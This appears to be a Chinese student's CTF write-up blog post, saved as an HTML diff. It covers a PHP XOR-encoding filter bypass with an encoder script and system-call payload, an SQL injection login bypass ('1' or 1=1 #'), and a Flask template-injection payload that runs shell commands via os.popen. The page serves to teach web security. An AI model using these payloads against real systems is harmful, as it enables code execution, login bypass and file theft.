@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="rce无字母密码绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一周web">
+<meta property="og:url" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="rce无字母密码绕过">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-13-27.png">
+<meta property="og:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-10-17.png">
+<meta property="og:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/6c258773c5fc6fca7229b978a7a27b8ff1b326f0.png">
+<meta property="article:published_time" content="2023-01-11T05:56:47.000Z">
+<meta property="article:modified_time" content="2023-02-04T08:15:30.906Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-13-27.png">
+
+<link rel="canonical" href="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>第一周web | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第一周web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-11 13:56:47" itemprop="dateCreated datePublished" datetime="2023-01-11T13:56:47+08:00">2023-01-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-02-04 16:15:30" itemprop="dateModified" datetime="2023-02-04T16:15:30+08:00">2023-02-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="rce无字母密码绕过"><a href="#rce无字母密码绕过" class="headerlink" title="rce无字母密码绕过"></a>rce无字母密码绕过</h3><img src="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-13-27.png" style="zoom: 67%;">
+
+<span id="more"></span>
+
+<p><code>/i 不区分大小写</code></p>
+<p><code>/s 字符串视为单行匹配</code></p>
+<p><code>preg_match()过滤了a-z，0-9，A-Z字符</code></p>
+<p>我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名。</p>
+<p>在PHP中，两个变量进行异或时，会先将字符串转换为<code>ASCII</code>值，再将<code>ASCII</code>值转换程二进制再进行异或，异或完，又将结果从二进制转换成了<code>ASCII</code>值，再将<code>ASCII</code>值转为字符串。</p>
+<p>在网上搜集到一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">command</span>):</span><br><span class="line">code = <span class="string">&quot;~`!@#$%&amp;*()-=+_[]&#123;&#125;;:&lt;&gt;,.?/|&quot;</span></span><br><span class="line">result_1 = <span class="string">&quot;&quot;</span></span><br><span class="line">result_2 = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command.isalpha():</span><br><span class="line">        result_1 += x</span><br><span class="line">        result_2 += x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">in</span> code:</span><br><span class="line">            result_1 += y</span><br><span class="line">            result_2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;result_1&#125;</span>&quot; ^ &quot;<span class="subst">&#123;result_2&#125;</span>&quot;)&#x27;</span></span><br><span class="line">a=encode(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+
+<p>异或绕过的脚本有了，知道是绕过了，但还是不知道要构造什么（悲）</p>
+<p>（喜）看了别人的博客，又看了ctf-wiki，知道要构造什么了</p>
+<p>构造<code>$&#123;_GET&#125;[_]($&#123;_GET&#125;[__])</code> <code>_</code>和<code>__</code>分别是两个不同的变量，因为php变量只能是_,数字和字母构成，所以可以用<code>_</code>来当作变量。</p>
+<p><code>_</code>这里的变量是<code>system</code>,<code>__</code>则是所要执行的命令。<code>system</code>是用来执行系统命令的。</p>
+<p>先执行<code>ls</code>查看当前目录下的文件，没有flag，不停回退查看，终于发现flag，cat即可。</p>
+<p>payload：<code>?code=$&#123;&quot;~&#123;~~&quot; ^ &quot;!&lt;;*&quot;&#125;[_]($&#123;&quot;~&#123;~~&quot; ^ &quot;!&lt;;*&quot;&#125;[__]);&amp;_=system&amp;__=cat ../../../ffffllllaaaagggg</code></p>
+<hr>
+<h3 id="BUUCTF-极客大挑战-2019-EasySQL"><a href="#BUUCTF-极客大挑战-2019-EasySQL" class="headerlink" title="BUUCTF_[极客大挑战 2019]EasySQL"></a>BUUCTF_[极客大挑战 2019]EasySQL</h3><p>！SQL注入！</p>
+<img src="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-10-17.png" style="zoom:50%;">
+
+<p>先判断闭合方式（单引号还是双引号）输入1，1’，1”，判断，当输入1’时报错，则是单引号闭合。</p>
+<p><code>select * from table_name where username=&#39;xxxx&#39; and password=&#39;xxxxxx&#39; ;</code></p>
+<p>验证登录注册查询数据库可能会用到以上巨型。如果用户密码匹配正确，则返回真，登录成功。</p>
+<p>如果让他不匹配数据库也能返回真值，那么就能绕过验证登录。</p>
+<p><strong>万能用户名</strong></p>
+<p> <code>username</code>为<code>1&#39; or 1=1 #</code> ,随意输入<code>password</code>，后端验证时，sql语句是</p>
+<p><code>select * from table_name where username=&#39;1&#39; or 1=1 # &#39; and password=&#39;xxxxxx&#39; ;</code></p>
+<p>而sql语句中，<code>#</code>为注释符，上语句等于</p>
+<p> <code>select * from table_name where username=&#39;1&#39; or 1=1 </code></p>
+<p>即<code>username</code>&#x3D;’1’ 或者 1&#x3D;1 ，二者满足一个则返回真，而1&#x3D;1恒为真，所以成功绕过验证，得到flag。</p>
+<p>万能密码同理</p>
+<hr>
+<h3 id="SSTI（模板注入）"><a href="#SSTI（模板注入）" class="headerlink" title="SSTI（模板注入）"></a>SSTI（模板注入）</h3><p>SSTI主要是python，PHP，Java的一些框架在使用渲染函数时，由于代码不规范或过于信任用户的输入导致了服务端模板注入。<br></p>
+<p>模板：类似于作文模板，是拼接字符串的体力活。</p>
+<p><img src="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/6c258773c5fc6fca7229b978a7a27b8ff1b326f0.png"></p>
+<p>把数据塞进模板里面，然后让渲染引擎把塞进去的东西生成html文本，返回给浏览器。</p>
+<p>这里提供几个解释概念和基操很好的几个博客（非常适合新手去了解一些基础的概念）<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dojo-lzz/p/5518474.html">浅谈模板引擎</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">flask之ssti模板注入从零到入门</a></p>
+<p>例题：bugku：Simple_SSTI_2<br>题解：python的flask框架的模板注入<br>手工注入<code>payload:/?flag=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()&#125;&#125;</code></p>
+<p>但是不理解怎么办？那就去试着理解ta</p>
+<blockquote>
+<p><code>config</code>为对象；</p>
+<p><code>__class__</code>:返回对象所属类；</p>
+<p><code>__init__</code>:类的初始方法，初始化实例，返回类型是function；</p>
+<p><code>__globals__</code>:使用方式是 函数名<code>.__globals__</code>获取function所处空间下可使用的module、方法以及所有变量；</p>
+<p><code>os</code>就是返回字典里的一个模块</p>
+<p><code>popen</code>()返回一个输出流，然后通过read()读取这个返回的流里面的数据</p>
+<p>payload构造过程：</p>
+<ol>
+<li>明确要利用的目标函数；<code>popen</code></li>
+<li>找到目标函数被定义的位置，目标模块<code>os</code>，或者目标类</li>
+<li>构造前一部分payload，大部分思路固定，目标是拿到所有Object类的子类</li>
+<li>如果这些子类很多没有加载，调用它们显式定义的方法，解析器会加载并执行模块，</li>
+<li>（如果模块刚好存在目标函数，则跳过该步）考虑在被加载模块中存在导入目标模块的import语句</li>
+<li>导入目标函数或者目标模块后，在当前命名空间就存在它们变量，这样一来就通过这个变量。</li>
+</ol>
+</blockquote>
+<hr>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8crypto/" rel="prev" title="第一周crypto">
+      <i class="fa fa-chevron-left"></i> 第一周crypto
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/" rel="next" title="第一周pwn">
+      第一周pwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#rce%E6%97%A0%E5%AD%97%E6%AF%8D%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">rce无字母密码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">BUUCTF_[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">SSTI（模板注入）</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
